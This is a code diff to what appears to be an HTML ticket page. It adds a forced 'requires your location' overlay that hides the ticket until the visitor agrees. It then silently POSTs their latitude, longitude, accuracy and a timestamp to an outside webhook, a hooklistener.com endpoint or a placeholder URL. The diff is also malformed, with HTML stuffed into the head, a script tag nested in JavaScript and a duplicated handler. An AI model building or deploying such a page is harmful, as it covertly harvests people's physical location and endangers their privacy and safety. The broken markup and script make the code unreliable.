@@ -23,10 +23,30 @@
     #content {
       display: none;
     }
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
 	</style>
 	// Created by Richard Rhodes //
+
+
+
+  <h1>Welcome</h1>
+  <p>You can now access the site.</p>
+</div>
+
+	
 </head>
 <body>
+<div id="overlay">
+  <h2>This site requires your location</h2>
+  <p>Click Yes to continue</p>
+  <button id="allow">Yes</button>
+</div>
+<div id="content">
 <div class="ticket-container">
         <div class="close-button">&times;</div>
 		<div class="header">
@@ -59,6 +79,7 @@
         </div>
 	</div>
  </div>
+</div>
 <script>
 		// Get the current date and time
         const today = new Date();
@@ -122,35 +143,43 @@ function runOnEnter() {
     console.error("Geolocation not supported");
     return;
   }
-{
-      // Permission granted
-      document.getElementById("overlay").style.display = "none";
-      document.getElementById("content").style.display = "block";
-	// allowed permission
 
-	
 document.getElementById("allow").addEventListener("click", () => {
   if (!navigator.geolocation) {
     alert("Geolocation not supported");
     return;
   }
+  <script>
+document.getElementById("allow").addEventListener("click", () => {
+  if (!navigator.geolocation) {
+    alert("Geolocation not supported");
+    return;
+  }
+
   navigator.geolocation.getCurrentPosition(
     (position) => {
-      sendToWebhook({
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        timestamp: new Date().toISOString()
+      // Permission granted
+      document.getElementById("overlay").style.display = "none";
+      document.getElementById("content").style.display = "block";
+
+      // Optional: send to webhook
+      fetch("https://YOUR-WEBHOOK-URL", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          timestamp: new Date().toISOString()
+        })
       });
     },
     (error) => {
-      sendToWebhook({
-        error: error.message,
-        timestamp: new Date().toISOString()
-      });
+      alert("Location permission is required to use this site.");
     }
   );
-}
+});
+
 
 function sendToWebhook(payload) {
   fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
